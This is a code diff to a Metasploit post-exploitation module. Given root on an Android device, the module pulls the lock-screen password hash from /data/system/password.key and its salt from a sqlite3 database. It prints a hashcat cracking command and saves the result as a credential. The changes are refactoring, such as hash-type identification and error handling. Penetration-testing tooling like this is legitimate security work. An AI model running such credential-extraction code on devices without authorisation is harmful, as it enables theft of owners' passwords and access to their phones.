@@ -5,6 +5,7 @@
 
 require 'sqlite3'
 require 'fileutils'
+require 'metasploit/framework/hashes/identify'
 
 class MetasploitModule < Msf::Post
 
@@ -20,6 +21,8 @@ class MetasploitModule < Msf::Post
            is required as this contains the hash but no salt.  Next, a sqlite3 database
            is needed (with supporting files) to pull the salt from.  Combined, this
            creates the hash we need.  This can be cracked with Hashcat, mode 5800.
+           Samsung devices only have SHA1 hashes, while most other Android devices
+           also have an MD5 hash.
         },
         'License'       => MSF_LICENSE,
         'Author'        => ['h00die'],
@@ -67,13 +70,12 @@ class MetasploitModule < Msf::Post
     end
 
     unless is_root?
-      print_error("This module requires root permissions.")
-      return
+      fail_with Failure::NoAccess, 'This module requires root permissions.'
     end
 
     print_status('Attempting to determine unsalted hash')
     unless file_exist?('/data/system/password.key')
-      print_error('No password.key file, no password on phone.')
+      print_error('No password.key file, no password on device.')
       return
     end
 
@@ -119,20 +121,20 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    puts salt
     # convert from number string to hex and lowercase
     salt = salt.to_i.to_s(16)
     print_good("Password Salt: #{salt}")
 
     sha1 = hash[0...40]
-    print_good("SHA1: #{sha1}:#{salt}")
-    print_good("Crack with: hashcat -m 5800 #{sha1}:#{salt}")
+    sha1 = "#{sha1}:#{salt}"
+    print_good("SHA1: #{sha1}")
+    print_good("Crack with: hashcat -m 5800 #{sha1}")
     credential_data = {
-        jtr_format: 'SHA1',
+        jtr_format: identify_hash(sha1),
         origin_type: :session,
         post_reference_name: self.refname,
         private_type: :nonreplayable_hash,
-        private_data: "#{sha1}:#{salt}",
+        private_data: sha1,
         session_id: session_db_id,
         username: '',
         workspace_id: myworkspace_id
@@ -141,13 +143,14 @@ class MetasploitModule < Msf::Post
 
     if hash.length > 40
       md5 = hash[40...72]
-      print_good("MD5: #{md5}:#{salt}")
+      md5 = "#{md5}:#{salt}"
+      print_good("MD5: #{md5}")
       credential_data = {
-          jtr_format: 'MD5',
+          jtr_format: identify_hash(md5),
           origin_type: :session,
           post_reference_name: self.refname,
           private_type: :nonreplayable_hash,
-          private_data: "#{md5}:#{salt}",
+          private_data: md5,
           session_id: session_db_id,
           username: '',
           workspace_id: myworkspace_id
